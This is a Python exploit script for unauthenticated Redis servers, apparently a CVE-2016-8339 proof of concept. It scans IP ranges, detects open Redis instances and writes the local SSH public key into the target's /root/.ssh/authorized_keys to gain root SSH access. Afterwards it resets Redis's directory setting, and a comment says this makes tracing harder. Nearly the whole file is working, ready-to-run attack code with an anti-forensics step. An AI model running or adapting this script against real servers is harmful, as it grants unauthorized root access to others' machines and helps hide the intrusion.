# coding=utf-8
"""
DATE:   2021/7/7
AUTHOR: TesterCC
"""

# pip install -i https://pypi.tuna.tsinghua.edu.cn/simple redis
import getopt
import ipaddress
import sys
import os
import platform
import redis
import time
import socket
import uuid

# 读取本地SSH public key
# 探测IP的Redis是否可用
# 尝试对未授权Redis进行SSH key写入

# 用来判断用于ssh getshell的public_key是否存在在当前目录下
# with open('/root/.ssh/id_rsa.pub','r') as file_key:
# with open('C:/Users/xxx/.ssh/id_rsa.pub', "r") as file_key:

# emd echo %USERPROFILE%



def get_local_ssh_key():
    # 根据操作系统决定默认路径
    if platform.system() == 'Windows':

        win_userprofile = os.popen("echo %USERPROFILE%").read()

        win_userprofile = str(win_userprofile).replace("\n", "").replace("\\", "/")

        default_public_key_path = win_userprofile + "/.ssh/id_rsa.pub"

    else:
        default_public_key_path = r"/root/.ssh/id_rsa.pub"

    print("[*] default_public_key_path:\n{}".format(default_public_key_path))

    public_key_path = default_public_key_path

    with open(public_key_path, 'r') as file_key:
        public_key = file_key.read()
        # print("[*] Get localhost SSH public key: \n{}".format(public_key))   # for debug

    return public_key


def banner():
    print('###### Redis Unauthorized Access Checker ######\n')


def usage():
    print('''
    Name: CVE-2016-8339 Redis未授权SSH提权Exp
    
    Usage: 
    
    python CVE-2016-8339.py -h
    python CVE-2016-8339.py -d 10.0.0.1 -p 6379
    
    -h: --help 帮助;
    -p: --port 端口;
    -d: --dst  目的IP;
    ''')
    sys.exit()


def write_ssh_key(ip, port="6379"):
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(1)
    try:
        sk.connect((ip, 22))  # 判断22端口是否开放
        print("[*] SSH is available!")
        sk.close()
    except Exception:
        print("[X] SSH is closed ...")
        sys.exit()

    try:
        r = redis.StrictRedis(host=ip, port=port, db=0, socket_timeout=0.3)  # 最后一个参数设置超时用的

        public_key = get_local_ssh_key()

        key = str(uuid.uuid1())  # 生成一个随机的key写入
        # r.config_set('stop-writes-on-bgsave-error', 'no')  # 解决持久化问题
        r.set(key, '\n\n{}\n\n'.format(public_key))
        r.config_set('dir', '/root/.ssh')  # 如果redis在非root下运行会抛出异常待完善
        r.config_set('dbfilename', 'authorized_keys')
        r.save()
        r.delete(key)  # 删除生成的随机key
        r.config_set('dir', '/tmp')  # 切换到非.ssh目录，给排查追溯增加难度
        time.sleep(2)
        print("[*] Attack Success! ")
    except Exception as err:
        print("[!] Attack Failed! ")
        print(err)


##未授权函数检测
def redis_unauthored(url, port):
    result = []
    s = socket.socket()
    payload = "\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
    socket.setdefaulttimeout(10)
    for ip in url:
        try:
            s.connect((ip, int(port)))
            s.sendall(payload.encode())
            recvdata = s.recv(1024).decode()
            if recvdata and 'redis_version' in recvdata:
                result.append(str(ip) + ':' + str(port) + ':' + 'success [V]')

                # 调用写ssh key的逻辑
                write_ssh_key(str(ip), port)

        except:
            result.append(str(ip) + ':' + str(port) + ':' + ' failed [X]')
        s.close()
    return (result)


def url_list(li):
    ss = []
    i = 0
    j = 0
    zi = []
    for s in li:
        a = s.find('-')
        i = i + 1
        if a != -1:
            ss = s.rsplit("-")
            j = i
            break
    for s in range(int(ss[0]), int(ss[1]) + 1):
        li[j - 1] = str(s)
        aa = ".".join(li)
        zi.append(aa)
    return zi


# 执行url
def url_exec(url):
    i = 0
    zi = []
    group = []
    group1 = []
    group2 = []
    li = url.split(".")
    if (url.find('-') == -1):
        group.append(url)
        zi = group
    else:
        for s in li:
            a = s.find('-')
            if a != -1:
                i = i + 1
        zi = url_list(li)
        if i > 1:
            for li in zi:
                zz = url_list(li.split("."))
                for ki in zz:
                    group.append(ki)
            zi = group
            i = i - 1
        if i > 1:
            for li in zi:
                zzz = url_list(li.split("."))
                for ki in zzz:
                    group1.append(ki)
            zi = group1
            i = i - 1
        if i > 1:
            for li in zi:
                zzzz = url_list(li.split("."))
                for ki in zzzz:
                    group2.append(ki)
            zi = group2
    return zi


# 输出结果格式设计
def output_exec(output, type):
    print("++++++++++++++++++++++++++++++++++++++++++++++++")
    print("|         ip        |    port   |     status   |")
    for li in output:
        print("+-------------------+-----------+--------------+")
        print("|     " + li.replace(":", "     |  ") + " |")
    print("+-------------------+-----------+--------------+\n")
    print("[*] Stop attack ... ")


# # 批量检测 - 保留
# def bundle_host_redis_check(port='6379'):
#     # 批量扫IP版本
#     ips = ipaddress.ip_network('10.0.4.0/24')
#     ips_list = [str(i) for i in ips]
#
#     # 10.0.4.148    10.0.4.69
#     target_ips = ips_list[68:72]
#     print(target_ips)
#
#     for url in target_ips:
#         output = redis_unauthored(url_exec(url), port)
#         output_exec(output, "Redis")

# 主函数，传入输入参数进入
def start(argv):
    url = ""
    port = 6379
    if len(sys.argv) < 2:
        print("-h 帮助信息;\n")
        sys.exit()
    # 定义异常处理
    try:
        banner()
        opts, args = getopt.getopt(argv, "-d:-p:-h")
    except getopt.GetoptError:
        print('Error an argument!')
        sys.exit()
    for opt, arg in opts:
        if opt == "-d":
            url = arg
        elif opt == "-p":
            port = arg
        elif opt == "-h":
            print(usage())

    output = redis_unauthored(url_exec(url), port)
    output_exec(output, "Redis")


if __name__ == '__main__':
    # bundle_host_redis_check()
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")
